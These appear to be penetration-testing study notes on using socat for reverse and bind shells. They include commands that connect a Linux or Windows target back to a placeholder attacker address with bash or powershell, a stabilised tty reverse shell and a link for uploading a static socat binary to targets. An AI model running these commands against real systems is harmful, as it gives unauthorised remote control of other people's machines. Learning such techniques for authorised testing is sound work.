Socat is similar to netcat in some ways, but fundamentally different in many others. The easiest way to think about socat is as a connector between two points.

## Reverse Shells

`socat TCP-L:<port> -`  

As always with socat, this is taking two points (a listening port, and standard input) and connecting them together. The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to `nc -lvnp <port>`.

On Windows we would use this command to connect back:

`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`  

The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.  

This is the equivalent command for a Linux Target:

`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`



## Bind Shells

On a Linux target we would use the following command:

`socat TCP-L:<PORT> EXEC:"bash -li"`  

On a Windows target we would use this command for our listener:

`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`  

We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.  

Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.

`socat TCP:<TARGET-IP>:<TARGET-PORT> -`

---

Now let's take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell. This will only work when the target is Linux, but is _significantly_ more stable. As mentioned earlier, socat is an incredibly versatile tool; however, the following technique is perhaps one of its most useful applications. Here is the new listener syntax:  

``socat TCP-L:<port> FILE:`tty`,raw,echo=0``  

Let's break this command down into its two parts. As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z, `stty raw -echo; fg` trick with a netcat shell -- with the added bonus of being immediately stable and hooking into a full tty.

The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a [precompiled socat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true), which can then be executed as normal.

**The special command is as follows:**

`socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

This is a handful, so let's break it down.

The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  `EXEC:"bash -li"`. We're also passing the arguments: pty, stderr, sigint, setsid and sane:

-   **pty**, allocates a pseudoterminal on the target -- part of the stabilisation process
-   **stderr**, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)  
    
-   **sigint**, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
-   **setsid**, creates the process in a new session
-   **sane**, stabilises the terminal, attempting to "normalise" it.

That's a lot to take in, so let's see it in action.

As normal, on the left we have a listener running on our local attacking machine, on the right we have a simulation of a compromised target, running with a non-interactive shell. Using the non-interactive netcat shell, we execute the special socat command, and receive a fully interactive bash shell on the socat listener to the left:

![[Pasted image 20220215010156.png]]

Note that the socat shell is fully interactive, allowing us to use interactive commands such as SSH. This can then be further improved by setting the stty values as seen in the previous task, which will let us use text editors such as Vim or Nano.

---

If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding `-d -d` into the command. This is very useful for experimental purposes, but is not usually necessary for general use.



